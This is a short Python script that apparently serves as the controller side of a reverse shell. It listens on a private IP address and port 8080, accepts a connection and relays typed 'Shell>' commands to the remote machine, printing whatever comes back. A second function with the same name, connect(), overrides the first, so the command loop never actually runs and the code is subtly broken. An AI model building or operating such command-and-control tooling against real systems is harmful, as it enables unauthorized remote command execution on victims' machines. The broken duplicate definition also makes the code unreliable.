import os
import socket


def connect():
    my_socket = socket.socket()
    my_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    my_socket.bind(("10.3.131.241",8080))
    my_socket.listen(1)
    connection, address = my_socket.accept()
    print("Connection established successfully",address)

    while True:
        command = input("Shell> : ")
        if "terminate" in command:
            connection.send("terminate".encode())
            connection.close()
            break
        else:
            connection.send(command.encode())
            print(connection.recv(5000).decode())

def connect():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("10.3.131.241",8080))
    s.listen(1)
    conn, addr = s.accept()
    print("Connection established successfully",addr)

def main():
    connect()

main()